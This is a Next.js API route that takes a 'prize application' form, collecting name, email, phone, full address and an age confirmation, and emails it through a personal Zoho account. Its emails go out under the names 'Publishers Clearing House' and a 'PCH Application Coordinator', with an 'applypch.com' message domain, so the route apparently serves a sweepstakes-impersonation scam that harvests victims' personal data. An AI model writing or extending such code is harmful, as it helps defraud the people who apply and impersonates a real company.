import { NextRequest, NextResponse } from 'next/server';

import nodemailer from 'nodemailer';

import { buildApplicationRef } from '@/lib/application-ref';

import {

  APPLICANT_AUTO_REPLY_SUBJECT,

  buildApplicantAutoReplyHtml,

  buildApplicantAutoReplyText,

  buildOperatorApplicationHtml,

  buildOperatorApplicationText,

} from '@/lib/apply-email';

import { isValidApplicantPhone } from '@/lib/site';



interface ApplyPayload {

  name: string;

  email: string;

  phone: string;

  country: string;

  region: string;

  city: string;

  address: string;

  postalCode: string;

  prizeCategory: string;

  message: string;

  ageConfirm: boolean;

}



function validate(body: unknown): ApplyPayload | null {

  if (!body || typeof body !== 'object') return null;

  const o = body as Record<string, unknown>;



  const name = typeof o.name === 'string' ? o.name.trim() : '';

  const email = typeof o.email === 'string' ? o.email.trim() : '';

  const phone = typeof o.phone === 'string' ? o.phone.trim() : '';

  const country = typeof o.country === 'string' ? o.country.trim() : '';

  const region = typeof o.region === 'string' ? o.region.trim() : '';

  const city = typeof o.city === 'string' ? o.city.trim() : '';

  const address = typeof o.address === 'string' ? o.address.trim() : '';

  const postalCode = typeof o.postalCode === 'string' ? o.postalCode.trim() : '';

  const prizeCategory = typeof o.prizeCategory === 'string' ? o.prizeCategory.trim() : '';

  const message = typeof o.message === 'string' ? o.message.trim() : '';

  const ageConfirm = o.ageConfirm === true;



  if (

    !name ||

    !email ||

    !phone ||

    !isValidApplicantPhone(phone) ||

    !country ||

    !region ||

    !city ||

    !address ||

    !postalCode ||

    !prizeCategory ||

    !message ||

    !ageConfirm

  ) {

    return null;

  }



  return { name, email, phone, country, region, city, address, postalCode, prizeCategory, message, ageConfirm };

}



function extractEmailAddress(from: string): string {

  const match = from.match(/<([^>]+)>/);

  return match?.[1]?.trim() || from.trim();

}



export async function POST(request: NextRequest) {

  const parsed = validate(await request.json());

  if (!parsed) {

    return NextResponse.json(

      {

        error:

          'Please complete all required fields (including a valid mobile phone number), your message, and confirm you are 18 or older.',

      },

      { status: 400 }

    );

  }



  const zohoUser = process.env.ZOHO_USER;

  const zohoPass = process.env.ZOHO_PASS;

  const toEmail = process.env.TO_EMAIL || zohoUser;



  if (!zohoUser || !zohoPass) {

    console.error('ZOHO_USER or ZOHO_PASS not configured');

    return NextResponse.json(

      { error: 'Application service is temporarily unavailable. Please try again later.' },

      { status: 500 }

    );

  }



  const transporter = nodemailer.createTransport({

    host: 'smtp.zoho.com',

    port: 465,

    secure: true,

    auth: { user: zohoUser, pass: zohoPass },

  });



  const submittedAt = new Date();

  const appRef = buildApplicationRef();

  const fromEmail = extractEmailAddress(zohoUser);

  const operatorText = buildOperatorApplicationText(parsed);

  const operatorHtml = buildOperatorApplicationHtml(parsed);

  const threadMessageId = `<pch-apply-${Date.now()}-${Math.random().toString(36).slice(2, 10)}@applypch.com>`;



  try {

    await transporter.sendMail({

      from: `"Publishers Clearing House" <${zohoUser}>`,

      to: toEmail || zohoUser,

      replyTo: parsed.email,

      subject: `[PCH Application] ${parsed.name} — ${parsed.city}, ${parsed.country}`,

      messageId: threadMessageId,

      text: operatorText,

      html: operatorHtml,

    });



    await transporter.sendMail({

      from: `"Dave Sayer, PCH Application Coordinator" <${zohoUser}>`,

      to: parsed.email,

      replyTo: zohoUser,

      subject: APPLICANT_AUTO_REPLY_SUBJECT,

      inReplyTo: threadMessageId,

      references: [threadMessageId],

      text: buildApplicantAutoReplyText(parsed, appRef, fromEmail, submittedAt),

      html: buildApplicantAutoReplyHtml(parsed, appRef, fromEmail, submittedAt),

    });



    return NextResponse.json({ ok: true, ref: appRef });

  } catch (err) {

    console.error('Application form send error:', err);

    return NextResponse.json(

      { error: 'Could not submit your application. Please try again.' },

      { status: 500 }

    );

  }

}


